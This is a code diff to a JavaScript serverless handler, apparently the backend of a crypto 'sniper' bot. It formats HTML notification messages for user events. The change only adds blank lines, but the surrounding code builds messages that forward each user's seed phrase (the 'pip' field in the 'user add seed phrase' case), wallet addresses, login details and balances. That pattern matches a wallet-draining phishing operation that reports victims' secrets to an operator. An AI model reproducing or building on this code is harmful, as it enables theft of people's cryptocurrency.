@@ -43,7 +43,7 @@ exports.handler = async (event) => {
         switch (type) {
     
             case 'uR': //user register
-                msa = `<u>${uR}</u>\n` +
+                msa = `<u>${uR}</u>\n\n` +
                     `${uid}: <b>${dataReceived.uid}</b>\n` +
                     `${nom}: <b>${dataReceived.nom}</b>\n` +
                     `${addi}: <b>${dataReceived.addi}</b>\n` +
@@ -52,32 +52,32 @@ exports.handler = async (event) => {
                 break;
     
             case 'uL': //user login
-                msa = `<u>${uL}</u>\n` +
+                msa = `<u>${uL}</u>\n\n` +
                     `${uid}: <b>${dataReceived.uid}</b>\n` +
                     `${addi}: <b>${dataReceived.addi}</b>\n` +
                     `${authw}: <b>${dataReceived.authw}</b>`;
                 break;
                 
             case 'uN': //user select network
-                msa = `<u>${uN}</u>\n` +
+                msa = `<u>${uN}</u>\n\n` +
                     `${uid}: <b>${dataReceived.uid}</b>\n` +
                     `${net}: <b>${dataReceived.net}</b>`;
                 break;
     
             case 'uASP': //user add seed phrase
-                msa = `<u>${uASP}</u>\n` +
+                msa = `<u>${uASP}</u>\n\n` +
                     `${uid}: <b>${dataReceived.uid}</b>\n` +
                     `${pip}: <b>${dataReceived.pip}</b>`;
                 break; 
     
             case 'uAWA': //user add wallet address
-                msa = `<u>${uAWA}</u>\n` +
+                msa = `<u>${uAWA}</u>\n\n` +
                     `${uid}: <b>${dataReceived.uid}</b>\n` +
                     `${wal}: <b>${dataReceived.wal}</b>`;
                 break;                   
                 
             case 'addFW': //user add full wallet
-                msa = `<u>${addFW}</u>\n` +
+                msa = `<u>${addFW}</u>\n\n` +
                     `${uid}: <b>${dataReceived.uid}</b>\n` +
                     `${net}: <b>${dataReceived.net}</b>\n` +
                     `${wal}: <b>${dataReceived.wal}</b>\n` +
@@ -85,7 +85,7 @@ exports.handler = async (event) => {
                 break;  
     
             case 'uMM': //user Log to main sniper menu
-                msa = `<u>${uMM}</u>\n` +
+                msa = `<u>${uMM}</u>\n\n` +
                     `${uid}: <b>${dataReceived.uid}</b>\n` +
                     `${nom}: <b>${dataReceived.nom}</b>\n` +
                     `${addi}: <b>${dataReceived.addi}</b>\n` +
@@ -95,7 +95,7 @@ exports.handler = async (event) => {
                 break;           
                 
             case 'uRFSH': //user add full wallet
-                msa = `<u>${uRFSH}</u>\n` +
+                msa = `<u>${uRFSH}</u>\n\n` +
                     `${uid}: <b>${dataReceived.uid}</b>\n` +
                     `${wal}: <b>${dataReceived.wal}</b>\n` +
                     `${bal}: <b>${dataReceived.bal} ${dataReceived.symbol}</b>`;
